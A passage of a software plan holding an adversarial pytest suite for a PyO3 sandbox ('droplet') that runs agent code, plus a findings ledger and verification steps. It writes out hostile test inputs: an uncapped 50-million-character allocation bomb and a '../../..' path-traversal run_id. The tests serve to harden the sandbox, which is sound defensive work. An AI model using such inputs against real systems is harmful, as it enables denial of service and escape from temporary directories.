# `PROBE` — Unsendable pyclass accessed cross-thread -> contained exception on the worker, never undefined behavior. Reaching the assertion (process alive, join returned) proves no segfault.
# seam: #[pyclass(unsendable)] Engine — touching it from a non-creating thread triggers pyo3's unsendable assertion (panic -> PanicException), never a segfault/UB
def test_engine_used_from_another_thread_surfaces_exception_never_ub(tmp_path):
    import threading
    p = _write_parquet(tmp_path, {'a':[1]})
    eng = droplet.Engine()
    box = {}
    def worker():
        try:
            eng.register_parquet(p); box['ok'] = True
        except BaseException as e:
            box['err'] = repr(e)
    t = threading.Thread(target=worker); t.start(); t.join()
    assert 'err' in box and 'ok' not in box  # unsendable cross-thread use must surface (panic-as-exception); reaching here proves no UB/segfault

# `PROBE` — Distinct from Engine cross-thread: Session owns the Monty REPL + DuckDB; run_code is the agent entrypoint, a separate unsendable pyclass with its own dispatch loop.
# seam: #[pyclass(unsendable)] Session.run_code from a non-creating thread
def test_session_used_from_another_thread_surfaces_exception_never_ub(tmp_path):
    import threading
    session = droplet.Session('fw-xthread')
    box = {}
    def worker():
        try:
            box['res'] = session.run_code('1+1')
        except BaseException as e:
            box['err'] = repr(e)
    t = threading.Thread(target=worker); t.start(); t.join()
    assert 'err' in box and 'res' not in box  # unsendable Session cross-thread -> surfaces, no UB

# `PROBE` — py.detach() must actually release the GIL so other Python threads run; a regression to holding the GIL would deadlock-starve the main thread. No other test checks concurrency liveness.
# seam: lib.rs run_code uses py.detach() to release the GIL; a concurrent pure-Python thread must make progress, no deadlock
def test_gil_released_during_run_code_other_thread_progresses(tmp_path):
    import threading
    done = threading.Event(); counter = {'n': 0}
    def heavy():
        s = droplet.Session('fw-gil')  # created + used in the SAME thread (unsendable-safe)
        s.run_code('total = 0\nfor i in range(200000):\n    total = total + i\ntotal')
        done.set()
    t = threading.Thread(target=heavy); t.start()
    while not done.is_set():
        counter['n'] += 1
        if counter['n'] > 5_000_000: break
    t.join(timeout=30)
    assert not t.is_alive()  # no deadlock
    assert counter['n'] > 0    # main thread ran concurrently => GIL was released by py.detach

# `HOLDS` — A raised RECOVERABLE agent exception must NOT poison the Session pyclass — it stays reusable AND keeps its persistent Monty namespace. Distinct from the bad-handle test, which is a HARD error that CONSUMES the REPL.
# seam: session.rs settle() restores the surviving REPL on a recoverable Monty error (ReplStartError carries it); lib.rs folds to RuntimeError; next run works + namespace persists
def test_agent_exception_raises_then_session_reusable_namespace_persists(tmp_path):
    session = droplet.Session('fw-reuse')
    with pytest.raises(RuntimeError):
        session.run_code('undefined_name_xyz')
    assert session.run_code('x = 21\nx * 2') == 42
    assert session.run_code('x + 1') == 22  # persistent namespace across steps through the firewall

# `PROBE` — A HARD engine error path (distinct from the recoverable NameError path) must leave the firewall in a defined state — clean RuntimeError or working session, never UB. Reaching the second assertion proves no crash.
# seam: session.rs: a hard engine error (bad SQL in query) consumes the REPL; subsequent run_code returns a clean DropletError, never panics
def test_hard_engine_error_then_clean_state_not_panic(tmp_path):
    path = _write_parquet(tmp_path, {'a':[1]})
    session = droplet.Session('fw-hard')
    with pytest.raises(RuntimeError):
        session.run_code(f'query({path!r}, "SELECT FROM WHERE GARBAGE(((")')
    try:
        assert session.run_code('1 + 1') == 2  # survived
    except RuntimeError:
        pass  # consumed-REPL clean error is also acceptable; contract is 'no panic/segfault'

# `PROBE` — An i64-overflowing result (BigInt) must surface a contained RuntimeError at the monty_to_py boundary, not truncate or panic. No other test targets the unsupported-variant arm with an integer.
# seam: lib.rs monty_to_py: MontyObject::BigInt falls to the `other =>` arm -> PyRuntimeError('unsupported value'); no overflow/crash
def test_huge_bigint_return_materializes_as_runtimeerror_not_crash(tmp_path):
    session = droplet.Session('fw-bigint')
    with pytest.raises(RuntimeError):
        session.run_code('2 ** 100')  # BigInt result is unsupported by the converter -> clean RuntimeError
    assert session.run_code('40 + 2') == 42  # firewall intact afterward (Complete path put the REPL back)

# `PROBE` — Attacks the CONTAINER/bytes unsupported variants (Set/FrozenSet/Bytes) of monty_to_py — distinct from the BigInt integer-overflow arm.
# seam: lib.rs monty_to_py unsupported-variant arm for MontyObject::Set / FrozenSet / Bytes
def test_unconvertible_set_frozenset_bytes_return_is_runtimeerror(tmp_path):
    session = droplet.Session('fw-set')
    for expr in ['{1, 2, 3}', 'frozenset([1, 2])', 'b\"\\x00\\x01\"']:
        with pytest.raises(RuntimeError):
            session.run_code(expr)
    assert session.run_code('1 + 1') == 2

# `PROBE` — The Dataset pyclass is just a name string with no engine identity, so handles silently confuse across engines — a genuinely distinct mechanism (no registry indirection on the Python side, unlike run_code int handles).
# seam: lib.rs pyclass Dataset carries ONLY the table NAME (ds_0); passing Engine A's Dataset to Engine B errors (fresh B) or silently reads B's own ds_0 (after B mints one)
def test_cross_engine_handle_confusion_reads_wrong_or_errors(tmp_path):
    import pyarrow as pa
    pA = _write_parquet(tmp_path, {'a':pa.array([1,2,3,4,5],pa.int64())})
    pB = _write_parquet(tmp_path, {'a':pa.array([9],pa.int64())})
    engA = droplet.Engine(); dsA = engA.register_parquet(pA)  # engA's ds_0 (5 rows)
    engB = droplet.Engine()
    with pytest.raises(RuntimeError):
        engB.to_rows(dsA)  # B is fresh: no ds_0 -> must raise (Catalog Error), not segfault/empty
    dsB = engB.register_parquet(pB)  # engB's own ds_0 (1 row, value 9)
    rows = engB.to_rows(dsA)  # dsA still names 'ds_0' -> SILENTLY reads engB.ds_0
    assert len(rows) == 1 and rows[0]['a'] == 9  # CURRENT wrong-data silent read; ideal contract = raise on foreign handle

# `HOLDS` — The firewall must reject mistyped Python args at the extraction layer (TypeError) before any Rust/DuckDB code runs. Distinct seam from the SQL/handle error paths.
# seam: lib.rs Engine.register_parquet(path: &str) PyO3 arg extraction; a non-str must TypeError, not crash
def test_wrong_python_type_to_register_parquet_is_typeerror(tmp_path):
    eng = droplet.Engine()
    for bad in [12345, None, ['x'], object()]:
        with pytest.raises(TypeError):
            eng.register_parquet(bad)

# `HOLDS` — Attacks the NESTED-tuple PyO3 extraction (Vec<(String,String)>), where wrong arity/element-type must be a clean Python error, not a panic. Distinct from the scalar register_parquet wrong-type gadget.
# seam: lib.rs Engine.group_agg(by: Vec<String>, metrics: Vec<(String,String)>) PyO3 extraction of nested tuples
def test_wrong_python_type_to_group_agg_metrics_is_error_not_crash(tmp_path):
    import pyarrow as pa
    eng = droplet.Engine(); ds = eng.register_parquet(_write_parquet(tmp_path, {'region':['EU'],'amt':pa.array([1],pa.int64())}))
    for bad_metrics in [[('total',)], [123], 'notalist', [('a','b','c')]]:
        with pytest.raises((TypeError, ValueError, RuntimeError)):
            eng.group_agg(ds, ['region'], bad_metrics)

# `HOLDS` — Without a #[new], the Python side cannot mint a Dataset pointing at an arbitrary DuckDB table name (e.g. a catalog view), so the only handles are engine-minted. Distinct from run_code int-handle forgery.
# seam: lib.rs #[pyclass(name='Dataset', frozen)] has NO #[new]; Python cannot forge a Dataset directly
def test_dataset_pyclass_has_no_python_constructor(tmp_path):
    with pytest.raises(TypeError):
        droplet.Dataset()
    with pytest.raises(TypeError):
        droplet.Dataset('ds_0')  # cannot fabricate a handle naming an arbitrary table from Python

# `PROBE` — memory_safety pins the Rust PRODUCER side (run_code materializes the deep list) but NO test exercises the droplet-py monty_to_py CONSUMER recursion (lib.rs) that walks the nested MontyObject to build PyList — a 4000-deep value could blow the Rust stack inside the converter and abort the Python process. This is the matching Python-boundary angle the memory_safety note explicitly defers to python_firewall. PROBE contract is 'no segfault/abort'; a contained RecursionError/RuntimeError or a correct nested list all pass; the final 1+1==2 proves containment.
# seam: (gap-fill, coverage critic)
def test_deeply_nested_return_value_does_not_overflow_monty_to_py(tmp_path):
    session = droplet.Session('fw-deepnest')
    try:
        out = session.run_code('x = 0\nfor i in range(4000):\n    x = [x]\nx')
        cur = out; depth = 0
        while isinstance(cur, list) and len(cur) == 1:
            cur = cur[0]; depth += 1
            if depth > 10: break
        assert depth >= 5  # genuinely nested, not a forged/truncated value
    except RecursionError:
        pass  # a contained Python RecursionError is acceptable
    except RuntimeError:
        pass  # a contained DropletError fold is acceptable
    # CONTRACT: reaching here (process alive) proves monty_to_py did NOT segfault/abort the interpreter.
    assert session.run_code('1 + 1') == 2

# `CANARY` — The entire dos_limits class is Rust-only; the Python firewall has NO DoS-containment angle. This pins, at the PyO3 boundary, that an agent allocation bomb is currently uncapped (companion to the Rust python_string_repeat/raw_string_replace CANARYs) and gives a single flip-point for when the limiter lands. Distinct interface (Python) from every Rust DoS test. CANARY pins current vulnerable-but-contained behavior (no abort at 50M); 50M not 500M to keep CI fast, the uncapped principle is identical.
# seam: (gap-fill, coverage critic)
def test_agent_memory_bomb_via_run_code_is_uncapped_canary_not_oom_abort(tmp_path):
    session = droplet.Session('fw-membomb')
    # CANARY: under the current NoLimitTracker the firewall does NOT bound agent allocation, so a 50M-char
    # string is built and its length crosses as a native int (no RuntimeError). Pins the gap at the PYTHON
    # boundary. Flip to `with pytest.raises(RuntimeError): session.run_code(...)` once a LimitedTracker
    # (ResourceLimits max_allocations/max_memory) is wired into Session.
    assert session.run_code("len('x' * 50000000)") == 50000000
    assert session.run_code('1 + 1') == 2  # session still usable
```

- [ ] **Step 2: Build the wheel + run + triage**

```bash
. .venv/bin/activate
maturin develop --manifest-path crates/droplet-py/Cargo.toml
pytest -q crates/droplet-py/python/tests/test_security.py
```
Expected: HOLDS green; triage PROBE/CANARY per protocol (e.g. `test_cross_engine_handle_confusion_*`
and `test_deeply_nested_return_value_*` are PROBEs — a wrong-data or abort is a finding).

- [ ] **Step 3: Commit**

```bash
git add -A && git commit -m "test(security): PyO3 firewall + parity adversarial suite (22 tests)"
```

---

## Task 13: Findings ledger + memory + final verification + self-review

**Files:**
- Create: `docs/security/2026-06-25-adversarial-suite-findings.md`
- Update: the `droplet-roadmap` memory + `MEMORY.md` index

- [ ] **Step 1: Write the findings ledger**

Create `docs/security/2026-06-25-adversarial-suite-findings.md` with one row per PROBE that turned up
a real finding during execution (the most likely candidates, to be confirmed empirically):

```markdown
# Adversarial suite — findings ledger (2026-06-25)

| ID | Test | Seam | Contract | Status | Notes |
|----|------|------|----------|--------|-------|
| F-1 | error_safety::run_code_wrong_arity_tool_call_is_contained_not_host_panic | macro thunk `args[i]` OOB in run_code FunctionCall arm | PROBE | TBD | If Monty forwards a short arg list the host PANICS across run_code (→ PyO3 abort). If it pre-validates arity, HOLDS. |
| F-2 | handles_args::PROBE_query_* / to_rows_zero_args | macro thunk `args[i]` OOB at dispatch | PROBE | TBD | Same root; unit-level. |
| F-3 | result_cap (wide-row / big-cell / uncapped run_code return) | cap is row-count only | PROBE | TBD | Cell-count and final-return-value are uncapped channels. |
| F-4 | isolation::run_id path traversal | `temp_dir().join(format!("droplet-{run_id}"))` | PROBE | TBD | `run_id="../../.."` may escape temp_dir on remove/create. |
| F-5 | python_firewall::cross_engine_handle_confusion | pyclass `Dataset` carries only the table name | PROBE | TBD | A handle from Engine A read on Engine B (with its own ds_0) returns WRONG data silently. |
| F-6 | dos_limits::watchdog_*_unbounded_canary | no `max_duration` wired | CANARY | open | Pure-CPU spin is unbounded; needs a host-interruptible time limit. |

For each confirmed PROBE finding: record the observed behavior, decide fix-now (only if it lives in
Droplet's own code per the agreed policy) vs. canary+track, and link the test that pins it.
```

- [ ] **Step 2: Update memory**

Append to `~/.claude/.../memory/droplet-roadmap.md` (and add an `MEMORY.md` index line) a note that the
adversarial security suite landed (~180 angle tests, the LimitedTracker budget, the findings ledger),
and that the V1a local-FS read canary now lives at `security/exfiltration.rs`.

- [ ] **Step 3: Final full-suite verification**

```bash
RUST_MIN_STACK=16777216 cargo test -p droplet-core
cargo clippy --workspace --all-targets -- -D warnings
. .venv/bin/activate && maturin develop --manifest-path crates/droplet-py/Cargo.toml && pytest -q crates/droplet-py/python/tests
# DoS watchdog canaries (opt-in; will report the spin findings):
RUST_MIN_STACK=16777216 cargo test -p droplet-core security::dos_limits -- --ignored
```
Expected: green workspace + pytest; clippy clean (the `#![allow(unused_imports)]` headers keep the
`-D warnings` gate happy); the `--ignored` watchdogs report the documented pure-CPU-spin findings.

- [ ] **Step 4: Self-review against the spec**

Confirm: (a) ≥100 distinct Rust angles + ≥15 Python angles present; (b) every accepted gap has a
CANARY; (c) every PROBE either passes or has a finding-ledger row; (d) no test weakens a real
protection to go green. Fix inline.

- [ ] **Step 5: Commit**

```bash
git add -A && git commit -m "docs(security): adversarial-suite findings ledger + memory + final verification"
```

---

## Self-review (plan author)

- **Spec coverage:** 11 attack classes from the threat model → 11 task files; the user's "100+ different angles incl. multi-hop exploit" → 158 distinct Rust + 22 Python angles, with the Hack-Monty class (`sort(key=)` UAF, GC cycles, finalizer resurrection, type confusion, re-entrant dispatch) explicit in `memory_safety`.
- **Decisions honored:** Rust-heavy + thin Python (172 Rust / 20 Python verified); canary+finding policy (PROBE→ledger, no Monty-internal fixes); minimal limiter wired (Task 2, `max_allocations`+`max_memory`).
- **No placeholders:** every test carries full attack+assertion code (empirically derived — the design agents built and ran them).
- **Type/name consistency:** all tests use the real signatures (`Session::run_code`, `dispatch`, `DropletError::{BadHandle,BadArg,Monty,Duckdb}`, `MontyObject` variants) confirmed against the source.

## Execution Handoff

Plan complete and saved. Two execution options:
1. **Subagent-Driven (recommended)** — fresh subagent per task, review between tasks, fast iteration.
2. **Inline Execution** — execute tasks in this session with checkpoints.

Which approach?
